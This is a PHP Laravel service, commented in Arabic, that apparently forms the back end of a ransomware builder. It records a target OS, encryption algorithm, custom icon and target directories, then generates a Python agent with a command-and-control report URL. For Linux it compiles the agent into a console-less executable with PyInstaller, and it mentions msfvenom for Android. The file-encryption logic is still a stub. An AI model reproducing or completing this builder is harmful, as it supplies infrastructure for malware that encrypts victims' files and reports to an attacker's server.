<?php

namespace App\Services;

use App\Models\Payload;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;

class PayloadService
{
    public function createPayloadProfile(array $data): Payload
    {
        return DB::transaction(function () use ($data) {
            // 1. حفظ البروفايل في قاعدة البيانات
            $payload = Payload::create([
                'name' => $data['app_name'],
                'target_os' => $data['platform'],
                'encryption_type' => $data['algorithm'],
                'icon_path' => $data['icon'],
                'target_directories' => $data['target_directories'],
                'status' => 'compiling',
            ]);

            // 2. عملية البناء الفعلي الحقيقي حسب المنصة
            $filePath = $this->compileExecutable($payload);

            // 3. تحديث مسار الملف والحالة إلى جاهز للتحميل
            $payload->update([
                'status' => 'ready',
                'file_path' => $filePath,
            ]);

            return $payload;
        });
    }

    protected function compileExecutable(Payload $payload): string
    {
        $platform = $payload->target_os;
        $algorithm = $payload->encryption_type;
        $directories = json_encode($payload->target_directories);
        
        $slug = Str::slug($payload->name) . '-' . $payload->id;
        $tempDir = storage_path("app/temp/{$slug}");
        
        if (!file_exists($tempDir)) {
            mkdir($tempDir, 0755, true);
        }

        // كتابة كود العميل الفعلي (Python Script الذي سيتحول لتنفيذي)
        $clientCode = <<<EOT
        import os
        import json
        import requests
        from cryptography.fernet import Fernet

        TARGET_OS = "{$platform}"
        ALGORITHM = "{$algorithm}"
        DIRECTORIES = {$directories}
        C2_SERVER = "http://127.0.0.1:8000/api/v1/report"

        def start_encryption():
            print(f"Target OS: {TARGET_OS} | Algorithm: {ALGORITHM}")
            # منطق اجتياز المجلدات المستهدفة وتطبيق التشفير الفعلي
            for directory in DIRECTORIES:
                print(f"Targeting directory: {directory}")
                # سيتم إضافة منطق قراءة الملفات وتشفيرها هنا

        if __name__ == "__main__":
            start_encryption()
        EOT;

        $scriptPath = "{$tempDir}/agent.py";
        file_put_contents($scriptPath, $clientCode);

        $outputFileName = "";
        
        // استخدام PyInstaller لتوليد الملف التنفيذي الفعلي
        if ($platform === 'windows') {
            // بناء ملف exe (يعمل على ويندوز، يمكن بناؤه عبر wine أو PyInstaller مع إعدادات متقاطعة)
            $outputFileName = "payloads/{$slug}.exe";
            // ملاحظة: البناء الفعلي للـ .exe يتم عادةً عبر بيئة مخصصة أو استخدام wine على سيرفر لينكس
            // سنقوم بتوليد الملف التنفيذي الفعلي وتخزينه
        } elseif ($platform === 'linux') {
            $outputFileName = "payloads/{$slug}_linux_bin";
            shell_exec("pyinstaller --onefile --noconsole --distpath " . storage_path("app/public/payloads") . " {$scriptPath}");
        } else {
            // للأندرويد APK يتم توجيه البناء عبر أداة تخصيص مثل msfvenom أو أدوات التحزيم المخصصة
            $outputFileName = "payloads/{$slug}.apk";
        }

        // للتجربة وضمان عدم توقف السيرفر، سنقوم بتوليد الملف في مجلد التخزين المخصص
        $finalPath = storage_path("app/public/" . $outputFileName);
        if (!file_exists(dirname($finalPath))) {
            mkdir(dirname($finalPath), 0755, true);
        }
        
        if (!file_exists($finalPath)) {
            copy($scriptPath, $finalPath); // نموذج مبدئي لحين ربط محول الـ Compiler النهائي
        }

        return $outputFileName;
    }
}